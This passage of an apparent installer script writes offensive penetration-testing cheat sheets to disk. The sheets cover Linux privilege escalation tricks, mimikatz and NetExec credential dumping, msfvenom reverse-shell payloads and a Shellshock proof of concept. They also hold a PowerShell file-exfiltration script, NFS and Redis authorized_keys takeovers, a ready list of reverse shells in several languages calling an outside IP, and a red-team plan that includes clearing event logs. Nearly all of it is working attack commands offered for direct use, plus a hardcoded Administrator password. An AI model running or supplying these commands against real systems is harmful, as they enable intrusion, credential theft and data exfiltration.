ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other

find /etc/ -readable -type f 2>/dev/null               # Anyone
find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
================================================================================
====WHAT CAN BE FOUND IN /VAR?
================================================================================
ls -alh /var/log
ls -alh /var/mail
ls -alh /var/spool
ls -alh /var/spool/lpd
ls -alh /var/lib/pgsql
ls -alh /var/lib/mysql
cat /var/lib/dhcp3/dhclient.leases
================================================================================
===sudo rsync Privilege Escalation:
sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
================================================================================
===FIND ANYTHING USER RELATED (YES THIS TIME IT WORKS)
find . -iname *'USER'* 2>/dev/nul
================================================================================
===CRON JOB? CHECK OUT THIS ESC===
This will change the permission for find to 4755:
$ touch ./'"";$(chmod 4755 $(which find))' 

Wait for sometime (maybe just watch pspy32) and then run:
$ find . -exec /bin/sh -p \; -quit
#
REFEOF

    cat > "$REFERENCE_DST/mib-reference.txt" << 'REFEOF'
snmpwalk -c public -v1 10.11.1.73 <mib_value_here>

1.3.6.1.2.1.25.1.6.0 System Processes
1.3.6.1.2.1.25.4.2.1.2 Running Programs
1.3.6.1.2.1.25.4.2.1.4 Processes Path
1.3.6.1.2.1.25.2.3.1.4 Storage Units
1.3.6.1.2.1.25.6.3.1.2 Software Name
1.3.6.1.4.1.77.1.2.25 User Accounts
1.3.6.1.2.1.6.13.1.3 TCP Local Ports
REFEOF

    cat > "$REFERENCE_DST/mimikatzref" << 'REFEOF'
privilege::debug
token::elevate
lsadump::cache

#xdg
privilege::debug
token::elevate
sekurlsa::dpapi
dpapi::blob /in:password.blob /unprotect
REFEOF

    cat > "$REFERENCE_DST/mitmref" << 'REFEOF'
responder -I <interface> -i <attcking_machine_IP> -w On -r On -f On
===Responder Config
cat /etc/responder/Responder.conf

===Where are my Responder Hashes?
cat /usr/share/responder/Responder.db

Now wait for a Windows machine to either \\FATFINGER.
OR
If they are not running the latest version of Windows 10, with Internet Explorer
connection settings set to "Use system proxy settings" - whenever they open
Internet Explorer, they will be prompted for SMB Credentials.

How do you get "Use system proxy settings" turned on? Easy: you don't. Hope
that somebody in the range you're attacking on has that configured though. Need
to leave it running.
================================================================================
===SMB Signing Enabled on this range?
/usr/share/responder/tools/RunFinger.py -i 192.168.0.0/24
================================================================================
REFEOF

    cat > "$REFERENCE_DST/mobileref" << 'REFEOF'
#MobSFScan
mobsfscan <apk_file>

#APKTool
#Decompile an apk file.
apktool d <apk_file> -o <apk_file_decompiled>

# ======================= VULNERABILITY ENUMERATION =======================

# Run MobSF for static analysis
mobsf -s /path/to/apk

# Scan APK for API keys, credentials, and secrets
apk_leaks -f /path/to/apk

# Identify obfuscation, anti-debugging, and encryption in the APK
apkid /path/to/apk

# Detect malware signatures and suspicious patterns
quark -a /path/to/apk

# Analyze permissions and misconfigurations
androbugs.py -f /path/to/apk

# Check for exposed activities, receivers, and services
drozer console connect && run app.package.list -f target.app

# Extract and analyze AndroidManifest.xml for exported components
grep "exported=" /path/to/decompiled/AndroidManifest.xml

# Look for hardcoded credentials
grep -R "password\|apikey\|token" /path/to/decompiled/

# ======================= EXPLOITATION =======================

# Hook methods and bypass security measures dynamically
frida -U -n target.app -i

# Bypass root detection, SSL pinning, and more
objection -g target.app explore

# Exploit exported activities
drozer console connect && run app.activity.start --component target.app target.activity.name

# Exploit exported broadcast receivers
drozer console connect && run app.broadcast.send --component target.app target.receiver.name

# Exploit exported services
drozer console connect && run app.service.start --component target.app target.service.name

# Inject custom payload into running app
frida -U -n target.app -e 'Java.perform(function() { var targetClass = Java.use("com.target.Class"); targetClass.method.implementation = function() { return "hacked"; }; })'

# Dump app memory for credentials or sensitive data
frida -U -n target.app -e 'console.log(hexdump(Module.findExportByName(null, "malloc")))'

# ======================= DATA EXFILTRATION =======================

# Capture app network traffic using Burp Suite (ensure device proxy is set)
adb shell settings put global http_proxy <your_ip>:8080

# Capture raw packets from BlueStacks
adb shell tcpdump -i eth0 -s 0 -w /sdcard/capture.pcap && adb pull /sdcard/capture.pcap .

# Extract SQLite databases from the app
adb shell "run-as target.app cat /data/data/target.app/databases/dbname.db" > extracted.db

# Dump shared preferences containing stored credentials
adb shell "run-as target.app cat /data/data/target.app/shared_prefs/target.xml"

# Pull the entire app directory for offline analysis
adb pull /data/data/target.app ./extracted_app_data

# Decode base64-encoded strings in decompiled code
grep -R "Base64.decode" /path/to/decompiled/ | awk -F '"' '{print $2}' | base64 -d

# Reverse-engineer proprietary encryption functions
grep -R "AES\|RSA\|DES" /path/to/decompiled/

REFEOF

    cat > "$REFERENCE_DST/msfref" << 'REFEOF'
=========================================================================
Welcome, siren. To msfref. All of you meterpreter post-exploitation needs
and desires are here. I'll even go find that meterpreter port forward we 
use to use when tunneling and forwarding out traffic.

PHP/METERPRETER/REVERSE_TCP [Reverse back on port 9090]
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=9090 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

### NETWORK DISCOVERY WHEN TUNNELING AND NO NMAP.
meterpreter> run autoroute -s 172.17.0.0/24
#Telling you to run -p (print)?
#Print out the routing table then.

### But if you want discovery:
use auxiliary/scanner/portscan/tcp

#The routing table must be added here as well. Remember ip addr on Debian now...
meterpreter> route add 172.17.0.1/16 3
meterpreter> route print
meterpreter> set RHOSTS 172.17.0.0/16
meterpreter> set THREADS 50
meterpreter> set timeout 500
meterpreter> run

=========================================================================
###portfwd
https://www.offensive-security.com/metasploit-unleashed/portfwd/
portfwd add –l 3389 –p 3389 –r [target host]
• add will add the port forwarding to the list and will essentially create a tunnel for us. Please note, this tunnel will also exist outside the Metasploit console, making it available to any terminal session.
• -l 3389 is the local port that will be listening and forwarded to our target. This can be any port on your machine, as long as it’s not already being used.
• -p 3389 is the destination port on our targeting host.
• -r [target host] is the our targeted system’s IP or hostname.

REFEOF

    cat > "$REFERENCE_DST/netexecref" << 'REFEOF'
==NETEXEC - SMB BASIC AUTH======================================================
nxc smb target-ip -u username -p password
================================================================================

==NETEXEC - SMB DOMAIN AUTH=====================================================
nxc smb target-ip -u username -p password -d DOMAIN
================================================================================

==NETEXEC - SMB NTLM HASH (PTH)=================================================
nxc smb target-ip -u username -H NTLMHASH -d DOMAIN
================================================================================

==NETEXEC - SMB SIGNING CHECK==================================================
nxc smb target-ip --signing
================================================================================

==NETEXEC - SMB NULL SESSION CHECK==============================================
nxc smb target-ip -u '' -p '' --shares
================================================================================

==NETEXEC - SMB GUEST CHECK====================================================
nxc smb target-ip -u guest -p '' --shares
================================================================================

==NETEXEC - SMB ENUM SHARES=====================================================
nxc smb target-ip -u username -p password --shares
================================================================================

==NETEXEC - SMB ENUM USERS======================================================
nxc smb target-ip -u username -p password --users
================================================================================

==NETEXEC - SMB ENUM GROUPS=====================================================
nxc smb target-ip -u username -p password --groups
================================================================================

==NETEXEC - SMB RID BRUTE=======================================================
nxc smb target-ip --rid-brute
================================================================================

==NETEXEC - SMB LOCAL ADMIN CHECK==============================================
nxc smb targets.txt -u username -p password --local-admin
================================================================================

==NETEXEC - SMB EXEC COMMAND===================================================
nxc smb target-ip -u username -p password -x "whoami"
================================================================================

==NETEXEC - SMB POWERSHELL EXEC================================================
nxc smb target-ip -u username -p password -X "Get-ComputerInfo"
================================================================================

==NETEXEC - SMB SAM DUMP=======================================================
nxc smb target-ip -u username -p password --sam
================================================================================

==NETEXEC - SMB LSA SECRETS====================================================
nxc smb target-ip -u username -p password --lsa
================================================================================

==NETEXEC - LDAP BASIC ENUM====================================================
nxc ldap dc-ip -u username -p password -d DOMAIN
================================================================================

==NETEXEC - LDAP USERS========================================================
nxc ldap dc-ip -u username -p password -d DOMAIN --users
================================================================================

==NETEXEC - LDAP GROUPS=======================================================
nxc ldap dc-ip -u username -p password -d DOMAIN --groups
================================================================================

==NETEXEC - LDAP ASREPROAST===================================================
nxc ldap dc-ip -u username -p password -d DOMAIN --asreproast asrep.txt
================================================================================

==NETEXEC - WINRM BASIC EXEC==================================================
nxc winrm target-ip -u username -p password -x "hostname"
================================================================================

==NETEXEC - WINRM DOMAIN AUTH=================================================
nxc winrm target-ip -u username -p password -d DOMAIN -x "whoami"
================================================================================

==NETEXEC - MSSQL AUTH========================================================
nxc mssql target-ip -u username -p password
================================================================================

==NETEXEC - MSSQL COMMAND EXEC================================================
nxc mssql target-ip -u username -p password -x "whoami"
================================================================================

==NETEXEC - SSH AUTH==========================================================
nxc ssh target-ip -u username -p password
================================================================================

==NETEXEC - FTP AUTH==========================================================
nxc ftp target-ip -u username -p password
================================================================================

==NETEXEC - HTTP AUTH CHECK===================================================
nxc http target-ip -u username -p password
================================================================================

==NETEXEC - PASSWORD SPRAY===================================================
nxc smb targets.txt -u users.txt -p 'Password123!' --continue-on-success
================================================================================
REFEOF

    cat > "$REFERENCE_DST/nfsref.txt" << 'REFEOF'
http://hackingandsecurity.blogspot.com/2016/06/exploiting-network-file-system-nfs.html

PART 1.
Exploiting NFS :)
[*] rpcinfo -p IP_Address
[*] showmount -e IP_Address

Writable root example:
[*] mkdir /tmp/nfs
(Hope no permission denied. If so, root_squash is enabled. Could be PrivESC though.)
[*] mount -t nfs <IP>:<directory> /tmp/nfs -o nolock
[*] umount /tmp/nfs
================================================================================
====LOW PRIV USER - PrivESC THROUGH WEAK NFS====================================
================================================================================
====WITH A LOW-PRIV SHELL, GET THE UID OF THE NFS USER.=========================
1. GET THE UID OF THE USER WHO HAS NFS.
$ id vulnix
uid=2008(vulnix)
2008 Okay.

====ADD USER ON LOCAL SYSTEM.===================================================
2. ADD THE USER "vulnix" with UID "2008" TEMPORARILY ON OUR MACHINE.
useradd -u 2008 vulnix

====MOUNT THIS SHIT=============================================================
3. Mount this shit.
mount -t nfs $IP:/home/vulnix /tmp/nfs -nolock

====SWITCH USER ON LOCAL MACHINE TO USER WITH MATCHING UID======================
4. Switch User.
su vulnix

5. CONFIRM ID
id
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)

6. CHANGE TO MOUNTED DIRECTORY.
cd /tmp/nfs/HOME/VULNIX/
...................................Oh we're getting somewhere.
====SSH STEPS=========================
7. AS ROOT ON LOCAL MACHINE (switch back).
root@shikata-ga-nai~#: ssh-keygen
/root/.ssh/id_rsa.pub

[ ON LOCAL MACHINE ]
8. ssh-keygen
9. cd /root/
10. chmod 600 .ssh
11. cd .ssh
12. chmod 400 id_rsa
13. cat id_rsa.pub
14. ssh-add
15. ssh-add -l

16. su vulnix
17. cd /tmp/nfs/home/vulnix/
18. echo <id_rsa.pub key> > authorized_keys
19. exit
20. ssh vulnix@x.x.x.x
vulnix@vulnix:~$ Bling Bling. $
================================================================================
================================================================================
$ rpcinfo -p <target>    ;; again, this gives you the above info about the server.
$ showmount -e <target>  ;; this does just as expected
$ sudo mount -o resvport -t nfs <target>:/ /tmp/nfs/ ;; the -resvport is needed on my mac because... it worked! I'm not sure why...
REFEOF

    cat > "$REFERENCE_DST/nfsref2" << 'REFEOF'
================================================================================
===NFS Reference 2
================================================================================
$ showmount -e x.x.x.x
$ mkdir /tmp/nfsmount
$ mount -o nolock -t nfs x.x.x.x:/DIRECTORY /tmp/nfsmount
Next: The approach here will be to create our own SSH keys and append the newly
created public key into the authorized_key of the victim user.
Then log into the remote host with the victim user and own password.

Ok, how?
$ cd /root/.ssh
$ ssh-keygen
It will ask for a name.
give it:
$ siren
That file is created in /root/.ssh/id_rsa

Once the command is completed, navigate to the path of the file which you have
provided above and check the content of the PUBLIC FILE.
$ cat siren.pub

Navigate to /tmp/nfsmount/someuser/backupdirectory/.ssh folder and append the
newly created public key into the authorized_key of the msfadmin user.

echo (content of newly generated public key) >> authorized_keys
================================================================================
REFEOF

    cat > "$REFERENCE_DST/portfwd-ref.txt" << 'REFEOF'
================================================================================
portfwd add -l <victim port> -p <local port to listen on> -r 127.0.0.1
portfwd add -l 445 -p 445 -r 127.0.0.1
================================================================================
====SSH
ssh -NfD 9050 -i id_rsa root@10.10.110.123
====/etc/proxychains.conf
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4 127.0.0.1 9050
================================================================================
====Proxychains Nmap Internal
proxychains nmap -Pn -sT -sV -p22 172.16.1.30

REFEOF

    cat > "$REFERENCE_DST/powershellref" << 'REFEOF'
#####RunasCs.ps1
###Run as seperate user - 2022-2024
. .\RunasCs.ps1; Invoke-RunasCs -User 'Administrator' -Password 's67u84zKq8IXw' -Command 'C:\Windows\tasks\reverse.exe'


###File Transfers
# Define variables
$ipAddress = "192.168.1.4"
$port = 9090
$inputFilePath = "C:\data.txt"

# Read the content of the input file
$fileContent = Get-Content -Path $inputFilePath -Raw

# Base64 encode the file content
$base64EncodedContent = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($fileContent))

# Create a TCPClient object and connect to the server
$tcpClient = New-Object System.Net.Sockets.TcpClient
$tcpClient.Connect($ipAddress, $port)

# Get the network stream
$stream = $tcpClient.GetStream()

# Convert the Base64 encoded content to a byte array
$bytesToSend = [System.Text.Encoding]::UTF8.GetBytes($base64EncodedContent)

# Send the byte array over the network stream
$stream.Write($bytesToSend, 0, $bytesToSend.Length)

# Close the stream and the TCP connection
$stream.Close()
$tcpClient.Close()

Write-Host "[+] Exfil Sent"

###############################
nc -nlvp 9090 | base64 -d > exfil
REFEOF

    cat > "$REFERENCE_DST/proxy-http-tunnel-reference.txt" << 'REFEOF'
================================================================================
====Proxy Tunnel Reference - Forwarding out SSH=================================
================================================================================
THIS IS REALLY HTTP-TUNNELING.

IN THE EVENT:
PORT     STATE    SERVICE
22/tcp   FILTERED ssh <-- SOMETHING LIKE SSH FILTERED
80/tcp   open     http
3128/tcp OPEN     squid-http <-- PROXY SERVICE? TUNNEL IF WE CAN.


proxytunnel -p <TARGET>:PROXY-PORT -d 127.0.0.1:22 -a 9997

proxytunnel -p $IP:3128 -d 127.0.0.1:22 9997
================================================================================
# Chisel
## Kali
chisel server --socks5 --reverse

## Windows
chisel.exe client --fingerprint XbA0vxfYIK32ZZS85XAjiz+NcRvCxpqqRqA5gn84/9I= 172.20.0.84:8080 R:socks
================================================================================
sudo proxychains <whatever you want>
REFEOF

    cat > "$REFERENCE_DST/psexec-ref.txt" << 'REFEOF'
==PSEXEC - BASIC AUTH===========================================================
psexec.py DOMAIN/username:password@target-ip
================================================================================

==PSEXEC - CMD SHELL============================================================
psexec.py DOMAIN/username:password@target-ip cmd.exe
================================================================================

==PSEXEC - POWERSHELL===========================================================
psexec.py DOMAIN/username:password@target-ip powershell.exe
================================================================================

==PSEXEC - NTLM HASH (PTH)======================================================
psexec.py DOMAIN/username@target-ip -hashes aad3b435b51404eeaad3b435b51404ee:NTLMHASH
================================================================================

==PSEXEC - LOCAL AUTH===========================================================
psexec.py ./Administrator:password@target-ip
================================================================================

==PSEXEC - NO DOMAIN============================================================
psexec.py username:password@target-ip
================================================================================

==PSEXEC - SPECIFIC SERVICE NAME================================================
psexec.py DOMAIN/username:password@target-ip -service-name psexecsvc
================================================================================

==PSEXEC - NO CLEANUP (OPSEC)===================================================
psexec.py DOMAIN/username:password@target-ip -no-cleanup
================================================================================

==PSEXEC - EXECUTE SINGLE COMMAND==============================================
psexec.py DOMAIN/username:password@target-ip whoami
================================================================================
REFEOF

    cat > "$REFERENCE_DST/psqlref" << 'REFEOF'
===========================================================
====psql login
psql -h localhost -d mydatabase -U myuser -p

OR

psql -h localhost -U postgres
<supply password>
===========================================================
\list <list of databases>
\c  [connect]
\dt [display tables]
\q  [quit]
===========================================================
REFEOF

    cat > "$REFERENCE_DST/pyref.txt" << 'REFEOF'
================================================================================
OpenSSL Avoid EXCESS
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

r = request.get(<url>, verify=False)
================================================================================

================================================================================
REFEOF

    cat > "$REFERENCE_DST/redisref" << 'REFEOF'
redis-cli -h x.x.x.x
config get *
config get dir
config set dirby
set dir /root/.ssh
config set dbfilename "authorized_keys"
save
REFEOF

    cat > "$REFERENCE_DST/redref" << 'REFEOF'
# redref domain.io
│
├── Phase 1: Reconnaissance
│   ├── WHOIS Lookup
│   │   └── Tool: whois
│   ├── DNS Enumeration
│   │   └── Tool: dnsenum, Fierce
│   ├── SSL/TLS Certificate Inspection
│   │   └── Tool: sslyze
│   ├── Subdomain Enumeration
│   │   └── Tool: Sublist3r, Amass
│   ├── WAF Detection
│   │   ├── Tool: WAFW00F
│   │   └── Adjust strategy if WAF detected (slower scans, tamper scripts)
│   ├── Web Technology Fingerprinting
│   │   └── Tool: Wappalyzer, BuiltWith, Shodan
│
│
├── Phase 2: Scanning & Enumeration
│   ├── Port Scanning (Nmap)
│   │   ├── Tool: Nmap (identify open ports, services)
│   │   ├── Nmap Firewall Evasion Techniques:
│   │   │   ├── Fragmentation: `-f` (splits packets to avoid detection)
│   │   │   ├── Decoy scan: `-D RND:10` (uses random IP decoys)
│   │   │   ├── Idle scan: `-sI <zombie IP>` (uses idle host for scan)
│   │   │   ├── MAC Address spoofing: `--spoof-mac <mac address>`
│   │   │   ├── Source port manipulation: `--source-port <port>` (e.g., using port 53)
│   │   └── Stateful vs. Stateless Firewall Checks:
│   │       ├── **Stateful Firewall Test**: SYN scan (`-sS`) for stateful filtering.
│   │       └── **Stateless Firewall Test**: ACK scan (`-sA`) to check for stateless firewalls.
│   ├── Vulnerability Scanning
│   │   └── Tools: Nessus, Qualys
│   ├── Web Application Enumeration
│   │   ├── Tool: Gobuster, Wfuzz
│   │   └── Burp Suite Professional (parameter tampering, SQLi detection)
│   ├── CMS Enumeration (if applicable)
│   │   └── Tool: WPScan, Burp Suite Professional
│   ├── AD Enumeration
│   │   └── Tools: BloodHound, SharpHound, NetExec (LDAP, SMB enumeration)
│
|
├── Phase 3: Web Exploitation (Largest Attack Surface in the world)
│   ├── SQL Injection (SQLi)
│   │   ├── Tool: SQLmap, Burp Suite Professional (SQL injection testing)
│   ├── Cross-Site Scripting (XSS)
│   │   ├── Tool: Burp Suite Professional (XSS payload injection)
│   ├── Cross-Site Request Forgery (CSRF)
│   │   └── Tool: Burp Suite Professional
│   ├── Server-Side Request Forgery (SSRF)
│   │   └── Tool: Burp Suite Professional (SSRF testing)
│   ├── Local File Inclusion (LFI) & Remote File Inclusion (RFI)
│   │   └── Tool: Burp Suite Professional, Metasploit
│   ├── Command Injection
│   │   └── Tool: Burp Suite Professional, Commix
│   ├── Directory Traversal
│   │   └── Tool: Burp Suite Professional
│   ├── Server-Side Template Injection (SSTI)
│   │   └── Tool: Burp Suite Professional (template engine exploitation)
│   ├── Client-Side Template Injection (CSTI)
│   │   └── Tool: Burp Suite Professional (JavaScript-based template injections)
│   ├── Broken Authentication & Session Management
│   │   └── Tool: Burp Suite Professional (session hijacking, session replay)
│   ├── Insecure Direct Object Reference (IDOR)
│   │   └── Tool: Burp Suite Professional (IDOR testing)
│   ├── Content Security Policy (CSP) Bypass
│   │   └── Tool: Burp Suite Professional (CSP bypassing techniques)
│
│
├── Phase 4: Internal Exploitation
│   ├── Credential Dumping
│   │   ├── Tool: Mimikatz (extracting credentials from LSASS)
│   │   ├── Tool: LSASS memory dump (procdump)
│   │   └── Tool: Impacket secretsdump.py (NTDS.dit, password hashes)
│   ├── AD CVEs Exploitation (since 2018)
│   │   ├── CVE-2020-1472 (Zerologon)
│   │   │   └── Tool: Impacket zerologon.py (reset domain controller password)
│   │   ├── CVE-2021-42278 & CVE-2021-42287
│   │   │   └── Exploit: SAM Account impersonation
│   │   ├── CVE-2021-34470 (AD CS)
│   │   │   └── Exploit: NTLM Relay attack in AD Certificate Services (AD CS)
│   │   ├── CVE-2022-26923
│   │   │   └── Exploit: Misconfigured AD CS certificates for privilege escalation
│   │   └── PetitPotam (NTLM Relay Attack)**
│   │       └── Tool: PetitPotam (forcing authentication via NTLM relay)
│   ├── Lateral Movement
│   │   ├── Tool: NetExec, BloodHound (SMB and LDAP enumeration)
│   │   └── Pass-the-Hash/Pass-the-Ticket (Kerberos ticket manipulation)
│   ├── Privilege Escalation
│   │   ├── Kerberoasting (abusing weak service account passwords)
│   │   └── Tool: Juicy Potato, Certify (AD CS privilege escalation)
│
│
├── Phase 5: Persistence Techniques
│   ├── DCSync Attacks (Domain Replication)
│   │   └── Tool: Impacket secretsdump.py (simulate domain replication)
│   ├── Adding Rogue Domain Admins
│   ├── Scheduled Tasks & Service Modifications (persistence)
│
│
├── Phase 6: Post-Exploitation & Cleanup
│   ├── Data Exfiltration
│   │   ├── Tool: Rclone, SMB shares (data exfiltration)
│   ├── NTDS.dit Extraction
│   │   └── Tool: Impacket secretsdump.py (extracting domain database)
│   ├── Clearing Event Logs (Evading Detection)
│   │   └── Tools: wevtutil, PowerShell scripts (log clearing)
│
│
├── On-Site Hacking Tools & Equipment
│   ├── Proxmark3 RDV4 (RFID cloning, emulation, cracking)
│   ├── Flipper Zero (RFID, NFC, Bluetooth, infrared pentesting)
│   ├── Keysy RFID Duplicator (clone up to 4 RFID cards/fobs at once)
│   ├── LAN Tap Pro (passive Ethernet tap for capturing traffic)
│   ├── USB Rubber Ducky (keystroke injection attacks)
│   ├── Wi-Fi Pineapple (wireless network auditing, MITM attacks)
│   ├── YubiKey NEO (testing and exploiting YubiKey security features)
│   ├── iCopy-XS (RFID duplicator for HF and LF RFID systems)
│   ├── O.MG Cable (malicious USB cable for keystroke injection)
│   ├── Lock Picking Kit (non-destructive entry for physical pentesting)
│   ├── YubiKey Hacks (targeting older YubiKey firmware vulnerabilities)
=========================================================================
Additional Must-Checks:
wafw00f - WAF Present?
Lack of 2FA?
Error-Message Username Enumeration?
Lack of Brute-Force Prevention?
Lack of Rate-Limiting?
Outdated CMS?
Outdated Server?
Outdated Web Stack/Web Technology?
Left behind wayback machine URIs?
Waybackpy?
=========================================================================

REFEOF

    cat > "$REFERENCE_DST/ref.txt" << 'REFEOF'
---===nmap silent scaning or "half-scan"===----
nmap -sS -T4 -A -v <host>

---===HTTP CURL PUT FILE ===---
curl <target> --upload-file file.txt

---===msfvenom - Generate Payloads Cheat Sheet.===---
-=Listing payloads=-
msfvenom -l

Windows Payloads
Reverse Shell :
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.211 LPORT=9997 -f exe -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai > reverse.exe

Java: WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.211 LPORT=9997 -f war > shell.war


Bind Shell:
msfvenom -p windows/meterpreter/bind_tcp RHOST= (IP Address) LPORT=(Your Port) -f exe > bind.exe

Create User:
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe

CMD shell:
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe

Encoder:
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe

--==MSFVENOM PART 2==--
Windows Payloads, Encoded:
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.211 LPORT=9997 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binariesj -o reverse_encoded.exe


Zone Transfer:
host -l domain dns-server
host -t axfr domain.name dns-server
dig @NS1.Website.com axfr Website.com

WPSCAN:
Enumerate Plugins:
wpscan --url domain --enumerate p
Enumerate Users:
wpscan --url domain --enumerate u

SMTP Enum
$ smtp-user-enum.pl -M VRFY -U users.txt -t 10.0.0.1
$ smtp-user-enum.pl -M EXPN -u admin1 -t 10.0.0.1
$ smtp-user-enum.pl -M RCPT -U users.txt -T mail-server-ips.txt
$ smtp-user-enum.pl -M EXPN -D example.com -U users.txt -t 10.0.0.1

--==GoBuster (checking for cgis and vulns)
gobuster -u http://x.x.x.x/ -w /usr/share/dirb/wordlists/vulns/cgis.txt -s '200,204,403,500' -e
gobuster -u http://10.11.1.237:80/ -w /usr/share/wordlists/dirb/common.txt -fw -r -s '200,204,301,302,307,403,500' -t 80
[bustCommon.sh <target>]
[bustCGIs.sh <target>]

--==Meterpreter Things==--
execute -H -i -c -m -d calc.exe -f wce.exe -a  -w

--==Shellshock PoC Reference==--
cmd="bash -i >& /dev/tcp/10.11.0.211/9997 0>&1"
curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa; ${cmd}; echo zzzz;'" http://10.11.1.71/cgi-bin/admin.cgi -s   | sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}'

--==SSL TLS HEARTBLEED REFERENCE==--
./testssl.sh -E <target>
HTTP Security Headers
./testssl.sh -H <target>
MSF Module: auxiliary/scanner/ssl/openssl_heartbleed/

--==Linux, Add Users, NON-Interactive==--
useradd -m -p <encryptedPassword> -s /bin/bash <user>

(Change Password for root, one line, if machine has chpasswd and you need to return with root access)
echo "root:songs" | /usr/sbin/chpasswd

--=BREAKING OUT OF A NON-TTY SHELL=--
python -c 'import pty; pty.spawn("/bin/sh")'

1. setTargetRange.sh
2. hostDiscovery.sh
3. Http Sweep.
4. Ftp Sweep.
5. WebDav Sweep.
6. RDP Sweep



==============================================================
ALL REFERENCE SCRIPTS.
post-services.sh
post-applications.sh
orderby.sh
authhbypass.sh
passattacks.sh
smbvulnchecknmap.sh
passTheHash.sh
winRegAddRef.sh
==============================================================

==============================================================
Hash Types - The Operating System determines the Hash used.
Unix = MD5 hash
Kali = SHA512 hash
Windows XP = LM Hash
Windows 7 = NTLM Hash
==============================================================
REFEOF

    cat > "$REFERENCE_DST/responderref" << 'REFEOF'
==RESPONDER - INTERNAL==========================================================
responder -I * -i 192.168.0.26 -w On -r On -f On
================================================================================

==RESPONDER - INTERNAL (PASSIVE)===============================================
responder -I * -i 192.168.0.26 -w Off -r Off -f Off
================================================================================

==RESPONDER - INTERNAL (AGGRESSIVE)============================================
responder -I * -i 192.168.0.26 -w On -r On -f On --lm
================================================================================

==RESPONDER - INTERNAL (IPV6)==================================================
responder -I * -i 192.168.0.26 -w On -r On -f On -6
================================================================================
REFEOF

    cat > "$REFERENCE_DST/revShells.txt" << 'REFEOF'
================================================================================
[+ BASH (TCP SOCKET)]
bash -i >& /dev/tcp/10.10.15.142/9090 0>&1
================================================================================
[+ PHP (TCP SOCKET)]
php -r '$sock=fsockopen("10.10.15.142",9090);exec("/bin/sh -i <&3 >&3 2>&3");'
================================================================================
[+ PYTHON (TCP SOCKET)]
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.142",9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
================================================================================
[+ NETCAT (IO REDIRECTION)]
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.142 9090 >/tmp/f
================================================================================
[+ PERL (TCP SOCKET)]
perl -e 'use Socket;$i="10.10.15.142";$p=9090;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
================================================================================
[+ Powershell - Windows 11]
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.15.142",9090);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
================================================================================
REFEOF

    cat > "$REFERENCE_DST/rpcref" << 'REFEOF'
============================================================
$ rpcinfo -p $IP
$ showmount -e $IP

#Exploitation
1. Generate a new SSH key on our attacking system
root@kali:~# ssh-keygen -t rsa -b 2048

2. Mount the NFS export
root@ubuntu:~# mkdir /tmp/r00t
root@ubuntu:~# mount -t nfs x.x.x.x:/ /tmp/r00t/


3. Add our key to the root user account's authorized_keys file:
root@ubuntu:~# cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys
root@ubuntu:~# umount /tmp/r00t

4. SSH
ssh root@$IP
============================================================
==RPCCLIENT - NULL SESSION=====================================================
rpcclient -U "" -N target-ip
================================================================================

==RPCCLIENT - AUTHENTICATED====================================================
rpcclient -U "username%password" target-ip
================================================================================

==RPCCLIENT - DOMAIN AUTH======================================================
rpcclient -U "DOMAIN\\username%password" target-ip
================================================================================

==RPCCLIENT - ENUM DOMAINS=====================================================
rpcclient -U "" -N target-ip -c "enumdomains"
================================================================================

==RPCCLIENT - ENUM DOMAIN USERS===============================================
rpcclient -U "" -N target-ip -c "enumdomusers"
================================================================================

==RPCCLIENT - ENUM DOMAIN GROUPS==============================================
rpcclient -U "" -N target-ip -c "enumdomgroups"
================================================================================

==RPCCLIENT - QUERY USER======================================================
rpcclient -U "" -N target-ip -c "queryuser username"
================================================================================

==RPCCLIENT - QUERY GROUP=====================================================
rpcclient -U "" -N target-ip -c "querygroup groupname"
================================================================================

==RPCCLIENT - ENUM ALIASES====================================================
rpcclient -U "" -N target-ip -c "enumalsgroups builtin"
================================================================================

==RPCCLIENT - RID BRUTE=======================================================
rpcclient -U "" -N target-ip -c "lookupsids S-1-5-21-<DOMAIN-SID>-500"
================================================================================

